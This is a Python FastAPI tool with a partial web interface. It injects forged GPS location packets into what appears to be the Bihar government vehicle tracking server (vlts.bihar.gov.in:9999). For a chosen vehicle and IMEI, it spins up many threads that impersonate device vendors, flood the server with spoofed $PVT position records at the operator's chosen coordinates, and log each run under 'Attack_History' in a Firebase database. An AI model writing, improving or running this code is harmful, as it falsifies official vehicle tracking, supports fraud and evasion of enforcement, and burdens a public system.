import socket, threading, time, requests, json
from datetime import datetime, timedelta, timezone
from fastapi import FastAPI
from fastapi.responses import HTMLResponse

app = FastAPI()
DB_URL = "https://ghop-ghop-gps-injection-default-rtdb.firebaseio.com"

firing = False
total_sent = 0
TAGS = ["RA18", "WTEX", "MARK", "ASPL", "LOCT14A", "ACT1", "AMAZON", "BBOX77", "EGAS", "MENT", "MIJO", "ROADRPA", "GRL"]

@app.get("/fetch_data")
def fetch_data(vno: str):
    v_up = vno.upper().strip()
    try:
        response = requests.get(f"{DB_URL}/Data_Records/{v_up}.json")
        data = response.json()
        if data: return {"found": True, "imei": data.get('IMEI_No',''), "lat": data.get('Lat',''), "lon": data.get('Lon','')}
    except: pass
    return {"found": False}

@app.get("/init")
def init(v:str, i:str, lt:str, ln:str):
    global firing, total_sent
    if not firing:
        v_up = v.upper().strip()
        firing, total_sent = True, 0
        
        # Immediate DB Update for Audit
        now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
        payload = {"IMEI_No": i, "Lat": lt, "Lon": ln, "Status": "Active", "Start": now.strftime('%H:%M:%S')}
        try: requests.put(f"{DB_URL}/Data_Records/{v_up}.json", json=payload)
        except: pass
        
        for tag in TAGS:
            threading.Thread(target=handshake_worker, args=(tag,i,v_up,lt,ln), daemon=True).start()
    return {"ok": True}

# --- 🚀 SPEED OPTIMIZED WORKER ---
def handshake_worker(tag, imei, vno, lat, lon):
    global firing, total_sent
    while firing:
        try:
            # Socket reuse logic for speed
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect(("vlts.bihar.gov.in", 9999))
            
            # Ek connection mein multiple packets bhej sakte hain fast speed ke liye
            for _ in range(10): 
                if not firing: break
                now = datetime.now(timezone.utc) + timedelta(hours=5, minutes=30)
                pkt = f"$PVT,{tag},2.1.1,NR,01,L,{imei},{vno},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{lat},N,{lon},E,0.00,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a83,e3c8,e3c7,0a83,7,e3fb,0a83,7,c79d,0a83,10,e3f9,0a83,0,0001,00,000041,DDE3*\\r\\n"
                s.sendall(bytes(pkt, 'ascii'))
                total_sent += 1
                time.sleep(0.02) # Fast delivery (0.1 se kam kiya)
            s.close()
        except: time.sleep(0.5)

@app.get("/status")
def status(): return {"c": total_sent, "f": firing}

@app.get("/stop")
def stop(): global firing; firing = False; return {"ok": True}

@app.get("/", response_class=HTMLResponse)
async def home():
    # UI Code remains same as previous, updating only SP function logic below
    return """
    <script>
        // ... (Login/Map logic same)

        async function sp() {
            fetch('/stop');
            clearInterval(mon); mon=null;
            let total = document.getElementById('c').innerText;
            let v_no = document.getElementById('v').value.toUpperCase().trim();
            
            if(parseInt(total) > 0 && v_no !== ""){
                let ist = new Date(new Date().getTime() + (5.5 * 60 * 60 * 1000));
                let dateKey = ist.toISOString().split('T')[0];
                
                let auditData = {
                    Vehicle_No: v_no,
                    IMEI_No: document.getElementById('i').value,
                    Lat: document.getElementById('lt').value,
                    Lon: document.getElementById('ln').value,
                    total_sent: total,
                    time: ist.toTimeString().split(' ')[0],
                    Status: "Completed"
                };
                
                // 🚀 FIX: Ab random ID ki jagah sidha Vehicle_No ke folder mein data save hoga
                // Use PUT instead of POST to avoid random keys
                await fetch(`${DB}/Attack_History/${dateKey}/${curUser.mobile}/${v_no}.json`, {
                    method: 'PUT', 
                    body: JSON.stringify(auditData)
                });
            }
            document.getElementById('st').innerText="IDLE";
        }
    </script>
    """
